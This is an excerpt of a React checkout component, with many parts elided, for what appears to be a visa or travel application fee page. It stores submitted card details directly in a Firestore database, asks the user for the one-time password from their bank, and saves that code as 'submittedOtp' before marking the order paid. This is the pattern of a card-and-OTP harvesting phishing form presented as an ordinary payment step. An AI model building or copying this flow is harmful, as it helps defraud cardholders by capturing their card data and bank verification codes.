...
import { ArrowLeft, ArrowRight, Home, Loader2, ShieldCheck } from 'lucide-react';
...
export function CheckoutForm() {
  ...
  useEffect(() => {
    ...
    if (data) {
      try {
        ...
        // If there's no data, we assume it's a test payment scenario
        setApplicationData({});
    }
  ...
  const handleNext = async (data?: any) => {
    if (currentStep === 1) {
      ...
      const isTestPayment = !applicationData?.fullName;

      const orderData = {
        ...(applicationData || {}),
        createdAt: serverTimestamp(),
        status: 'pending_payment',
        amount: isTestPayment ? 1 : 116.00,
        cardDetails: {
      ...
      if (isTestPayment) {
        orderData.fullName = "Test User";
        orderData.email = "test@example.com";
        orderData.nationality = "other";
        orderData.passportNumber = "TESTPAY123";
        orderData.travelReason = "tourism";
      }
      
      try {
        await setDoc(doc(db, "orders", newOrderId), orderData);
        toast({ title: "Awaiting Payment Verification", description: "Please enter the OTP from your bank to verify." });
        setCurrentStep(3);
      } catch (error) {
  ...
  const handleVerify = async (otp: string) => {
    ...
    try {
        ...
        await updateDoc(orderRef, { status: 'paid', submittedOtp: otp });
    ...
    <div className="min-h-screen bg-background text-foreground flex flex-col items-center justify-center p-4">
        <Card className="w-full max-w-lg shadow-lg">
            <CardHeader>
                ...
                <CardDescription>
                    {stepsConfig[currentStep - 1]?.title || 'Loading...'}
                </CardDescription>
                <Progress value={progressValue} className="mt-4" />
            </CardHeader>
            <CardContent className="min-h-[425px]">
                {renderStepContent()}
            </CardContent>
            {currentStep <= 2 && (
                <CardFooter className="flex justify-between">
                    <Button type="button" variant="outline" onClick={handleBack} disabled={isProcessing || currentStep === 1}>
